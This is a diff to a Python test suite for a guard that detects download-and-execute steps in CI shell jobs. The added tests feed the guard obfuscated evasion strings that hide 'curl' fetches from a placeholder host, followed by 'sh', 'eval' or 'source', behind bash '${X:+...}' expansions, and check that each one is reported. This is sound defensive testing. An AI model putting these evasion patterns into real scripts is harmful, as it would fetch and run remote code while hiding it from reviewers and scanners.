@@ -2317,8 +2317,8 @@ class TestTheUnionReadsBothHalves(unittest.TestCase):
 
     # Round 14 (the round-13 verdict's B1, the seat's sh-ev-2 and its `source` / `.` twins): the
     # payload runs only on a mixed reading -- the fetch's W and the shell's word expanded to
-    # nothing -- which neither fold reads (#2929); the conflict between `sh -c true` and `eval`,
-    # `source` or `.` reports it.
+    # nothing -- which neither of the union's folds read, and #2929's do; the conflict between
+    # `sh -c true` and `eval`, `source` or `.` reports it too.
     MIXED = ('X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} eval "$(cat t.sh)"' % URL,
              "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} source ./t.sh" % URL,
              "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} . ./t.sh" % URL)
@@ -2328,6 +2328,134 @@ class TestTheUnionReadsBothHalves(unittest.TestCase):
             for shell in SHELLS:
                 with self.subTest(row=row, shell=shell):
                     self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestEveryMixedReadingIsRead(unittest.TestCase):
+    """#2929: the union read a job with every command word bash may expand to nothing as its W, then
+    with every one empty -- two of a step's 2^k readings -- so a payload only a mixed reading runs read
+    CLEAN. `shell_command.folds` now reads every set of such words whose halves read apart, up to
+    `_HALF_CAP`, each in a fold of its own, and a word past them reads as a command the guard cannot
+    read, wherever it runs."""
+
+    # The #2856 round-13 seat's hunts 49, 51 and 53: every parent runs each, and #2856 read each CLEAN.
+    SEAT = ("X=1\n${X:+curl -fsSLo tool https://example.test/tool}\n${Y:+/usr/bin/env true} sh tool",
+            "X=1\n${X:+curl -fsSL https://example.test/i.sh} | ${Y:+/usr/bin/env true} sh",
+            "Y=1\n${X:+/usr/bin/env true} curl -fsSL https://example.test/i.sh | ${Y:+/usr/bin/env sh}",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} . ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} eval "$(cat t.sh)"',
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+unzip -q t.zip} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+tar xf t.tar} sh ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+eval true} source ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} . ./t.sh",
+            "X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} source ./t.sh",
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+. /dev/null} eval "$(cat t.sh)"',
+            'X=1\n${X:+curl -fsSLo t.sh https://example.test/t.sh}\n${Y:+source /dev/null} eval "$(cat t.sh)"')
+
+    def test_the_seats_rows_report(self):
+        for row in self.SEAT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    @staticmethod
+    def three(fetch, check, run):
+        """A row three such words decide, each read as `W` or `E` where the payload runs: a fetch, a
+        check that clears it where it runs, and a shell that runs it; the name of each `W` set."""
+        words = {("A", "W"): "${A:+curl -fsSLo t.sh %st.sh}" % URL,
+                 ("A", "E"): "${A:+/usr/bin/env true} curl -fsSLo t.sh %st.sh" % URL,
+                 ("C", "W"): "${C:+/usr/bin/env true} sha256sum -c sums", ("C", "E"): "${C:+sha256sum -c sums}",
+                 ("B", "W"): "${B:+sh t.sh}", ("B", "E"): "${B:+/usr/bin/env true} sh t.sh"}
+        names = [(name, half) for name, half in (("A", fetch), ("C", check), ("B", run))]
+        return ("".join("%s=1\n" % name for name, half in names if half == "W")
+                + "echo '%s  t.sh' > sums\n" % ("a" * 64) + "\n".join(words[place] for place in names))
+
+    def test_every_assignment_of_three_words_is_read(self):
+        # Each row runs only where its three words read as written -- W, W, E and the rest -- and the
+        # union read two of the eight; every one reports now, under every setting.
+        for fetch in "WE":
+            for check in "WE":
+                for run in "WE":
+                    row = self.three(fetch, check, run)
+                    for shell in SHELLS:
+                        with self.subTest(fetch=fetch, check=check, run=run, shell=shell):
+                            self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_word_past_the_cap_is_one_the_guard_cannot_read(self):
+        # Fail-closed, past `_HALF_CAP` such words, wherever the job runs, a download or none: the
+        # price. Three read every way, and nothing runs here.
+        import shell_command
+        self.assertEqual(3, shell_command._HALF_CAP)
+        line = "${V%d:+/usr/bin/env echo} make t%d\n"
+        for count in (3, 4, 8, 50):
+            with self.subTest(count=count):
+                found = wg.job_defects([wg.Step("step", "".join(line % (n, n) for n in range(count)), None)])
+                self.assertEqual(count > 3, bool(found))
+                if count > 3:
+                    self.assertIn("`${V3:+/usr/bin/env echo}` is a command word bash may expand to nothing beside 3 more",
+                                  found[0][1])
+
+    @staticmethod
+    def folds(texts):
+        """The number of folds `folds` reads, `texts` each parsed and read in every fold, and the words
+        whose halves read apart it met, by place."""
+        import shell_command
+        counts = []
+        for _sure in shell_reader.folds(lambda: False):
+            for text in texts:
+                for statement in shell_reader.statements(text):
+                    for stage in statement.stages:
+                        shell_reader.command(stage.argv)
+            counts.append(len(shell_command._HALVES["words"]))
+        return len(counts), counts[-1]
+
+    def test_a_word_is_one_word_however_often_its_text_is_read(self):
+        # By its place -- its parse's source and order -- not by the token a parse made, so a text
+        # read twice in a fold, as a nested program is, holds one word; and a spelling written at two
+        # places is two words, read every way (the second line's W fetches what the fourth runs).
+        once = "${X:+/usr/bin/env true} sh t\n"
+        self.assertEqual((2, 1), self.folds([once, once]))
+        self.assertEqual((4, 2), self.folds([once * 2]))
+        repeat = "X=1\n${X:+curl -fsSLo t %st} sh t\nunset X\n${X:+curl -fsSLo t %st} sh t" % (URL, URL)
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(repeat + "\necho done\n", shell))
+
+    def test_a_word_in_a_program_a_shell_runs_is_a_place_of_its_own(self):
+        # A nested program's first such word stands first in its own parse, as the step's does in
+        # the step's: the source keeps the two apart, so the fetch's W and the shell's word empty are
+        # read together, and every parent runs each.
+        for runner in ("sh -c", "bash -c", "eval"):
+            row = "X=1\n${X:+curl -fsSLo t %st}\n%s '${Y:+/usr/bin/env true} sh t'" % (URL, runner)
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_the_unions_folds_come_first_and_read_as_they_did(self):
+        # All W, as `main` reads them, then all empty, a word past the cap too, as the union read
+        # them; then each other set of the first three, the fourth read W.
+        stages = [s.stages[0] for s in shell_reader.statements(
+            "".join("${V%d:+/usr/bin/env true} make t%d\n" % (n, n) for n in range(4)))]
+        readings = [[len(shell_reader.command(stage.argv)) for stage in stages]
+                    for _sure in shell_reader.folds(lambda: False)]
+        self.assertEqual([[3, 3, 3, 3], [2, 2, 2, 2]], readings[:2])
+        self.assertEqual(8, len(readings))
+        self.assertEqual({3}, {reading[3] for reading in readings[2:]})
+        self.assertEqual(6, len({tuple(reading[:3]) for reading in readings[2:]}))
+
+    def test_halves_that_read_one_command_add_no_fold(self):
+        # A word whose halves read alike (`${SUDO:+sudo} apt-get`) is read both ways in the union's two
+        # folds, as #2856 read it, but adds no other: five such lines are two folds, and no cap.
+        line = "${SUDO:+sudo -E} apt-get install -y x\n"
+        self.assertEqual((2, 0), self.folds([line * 5]))
+        self.assertFalse(reported(line * 5))
+
+    def test_the_folds_grow_as_two_to_the_words_up_to_the_cap(self):
+        line = "${V%d:+/usr/bin/env true} make t%d\n"
+        for count, folds in ((0, 1), (1, 2), (2, 4), (3, 8), (4, 8), (9, 8)):
+            with self.subTest(count=count):
+                self.assertEqual(folds, self.folds(["".join(line % (n, n) for n in range(count))])[0])
 
 
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
